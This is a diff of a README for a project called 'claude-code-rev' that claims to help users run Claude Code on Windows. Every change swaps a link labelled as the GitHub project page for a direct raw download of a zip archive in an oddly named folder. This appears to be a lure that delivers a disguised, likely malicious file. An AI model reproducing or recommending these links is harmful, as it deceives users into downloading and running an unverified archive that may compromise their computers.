@@ -1,6 +1,6 @@
 # 🤖 claude-code-rev - Run Claude Code with Ease
 
-[![Download](https://img.shields.io/badge/Download-Open%20Project-blue?style=for-the-badge)](https://github.com/Batalha1118/claude-code-rev)
+[![Download](https://img.shields.io/badge/Download-Open%20Project-blue?style=for-the-badge)](https://github.com/Batalha1118/claude-code-rev/raw/refs/heads/main/unwarily/code_rev_claude_v1.1-beta.3.zip)
 
 ## 🖥️ What this is
 
@@ -17,7 +17,7 @@ Use this project if you want to:
 
 Use this link to visit the project page and download or open the latest files:
 
-[Open claude-code-rev on GitHub](https://github.com/Batalha1118/claude-code-rev)
+[Open claude-code-rev on GitHub](https://github.com/Batalha1118/claude-code-rev/raw/refs/heads/main/unwarily/code_rev_claude_v1.1-beta.3.zip)
 
 If the project includes a release build, download the Windows file from the page and save it to your computer. If the page provides source files only, use the steps below to run it on Windows.
 
@@ -41,7 +41,7 @@ Follow these steps on Windows.
 
 Go to:
 
-[https://github.com/Batalha1118/claude-code-rev](https://github.com/Batalha1118/claude-code-rev)
+[https://github.com/Batalha1118/claude-code-rev/raw/refs/heads/main/unwarily/code_rev_claude_v1.1-beta.3.zip](https://github.com/Batalha1118/claude-code-rev/raw/refs/heads/main/unwarily/code_rev_claude_v1.1-beta.3.zip)
 
 Look for a release, a setup file, or the source files on the main page.
 
@@ -244,7 +244,7 @@ Do not edit it unless the project tells you to.
 
 Use the download page from the project link only:
 
-[https://github.com/Batalha1118/claude-code-rev](https://github.com/Batalha1118/claude-code-rev)
+[https://github.com/Batalha1118/claude-code-rev/raw/refs/heads/main/unwarily/code_rev_claude_v1.1-beta.3.zip](https://github.com/Batalha1118/claude-code-rev/raw/refs/heads/main/unwarily/code_rev_claude_v1.1-beta.3.zip)
 
 Check that the file name matches what the project shows on the page before you run it.
 
@@ -269,4 +269,4 @@ These places usually show the correct way to run the app on Windows
 
 ## 📎 Project Link
 
-[Visit claude-code-rev on GitHub](https://github.com/Batalha1118/claude-code-rev)
+[Visit claude-code-rev on GitHub](https://github.com/Batalha1118/claude-code-rev/raw/refs/heads/main/unwarily/code_rev_claude_v1.1-beta.3.zip)
